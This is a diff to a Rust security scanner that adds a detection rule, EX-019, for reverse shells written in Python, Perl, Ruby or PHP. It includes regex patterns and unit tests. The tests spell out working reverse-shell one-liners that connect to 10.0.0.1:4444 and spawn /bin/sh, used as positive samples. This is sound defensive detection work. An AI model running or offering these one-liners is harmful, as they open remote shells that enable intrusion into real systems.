@@ -20,6 +20,7 @@ pub fn rules() -> Vec<Rule> {
         ex_016(),
         ex_017(),
         ex_018(),
+        ex_019(),
     ]
 }
 
@@ -595,6 +596,44 @@ fn ex_018() -> Rule {
         cwe_ids: &["CWE-918", "CWE-200"],
     }
 }
+
+fn ex_019() -> Rule {
+    Rule {
+        id: "EX-019",
+        name: "Scripting-language reverse shell",
+        description: "Detects reverse shells built from a scripting language's socket and exec primitives (Python/Perl/Ruby/PHP), complementing the netcat/socat//dev/tcp rules (MITRE T1059, T1071)",
+        severity: Severity::Critical,
+        category: Category::Exfiltration,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Python fd redirection into a subprocess (classic reverse shell)
+            Regex::new(r"os\.dup2\([^\n]*\bsubprocess").expect("EX-019: invalid regex"),
+            // Python reverse-shell import combo
+            Regex::new(r"import\s+socket\s*,\s*subprocess|import\s+subprocess\s*,\s*socket|socket\s*,\s*subprocess\s*,\s*os")
+                .expect("EX-019: invalid regex"),
+            // Python pty spawning an interactive shell
+            Regex::new(r#"pty\.spawn\(\s*['"]?/?(bin/)?(ba)?sh"#).expect("EX-019: invalid regex"),
+            // Perl reverse shell (Socket + exec)
+            Regex::new(r"perl\s+-e[^\n]*(Socket|socket)[^\n]*exec").expect("EX-019: invalid regex"),
+            // Ruby reverse shell
+            Regex::new(r"ruby\s+-rsocket[^\n]*(exec|/bin/sh)").expect("EX-019: invalid regex"),
+            // PHP reverse shell via fsockopen
+            Regex::new(r"php\s+-r[^\n]*fsockopen").expect("EX-019: invalid regex"),
+            Regex::new(r"fsockopen\([^\n]*(exec|/bin/sh|proc_open|shell_exec)")
+                .expect("EX-019: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("EX-019: invalid regex"),
+        ],
+        message: "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+        recommendation: "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network.",
+        fix_hint: Some(
+            "Delete the socket+exec reverse-shell one-liner; legitimate networking should use documented, reviewable tools.",
+        ),
+        cwe_ids: &["CWE-506", "CWE-912"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -868,5 +907,50 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ex_018.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ex_018", findings);
+    }
+
+    #[test]
+    fn test_ex_019() {
+        let rule = ex_019();
+        let test_cases = vec![
+            // Malicious: scripting-language reverse shells
+            (
+                r#"python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'"#,
+                true,
+            ),
+            (r#"python3 -c 'import pty; pty.spawn("/bin/bash")'"#, true),
+            (
+                r#"perl -e 'use Socket;connect(S,...);exec("/bin/sh -i");'"#,
+                true,
+            ),
+            (
+                r#"ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4444");exec"/bin/sh -i"'"#,
+                true,
+            ),
+            (
+                r#"php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'"#,
+                true,
+            ),
+            // Benign: standalone socket/subprocess/scripting usage
+            ("import socket", false),
+            (r#"subprocess.run(["ls", "-l"])"#, false),
+            (r#"perl -e 'print "hello\n"'"#, false),
+            ("php -r 'echo phpversion();'", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "EX-019: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ex_019() {
+        let rule = ex_019();
+        let content = include_str!("../../../tests/fixtures/rules/ex_019.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ex_019", findings);
     }
 }
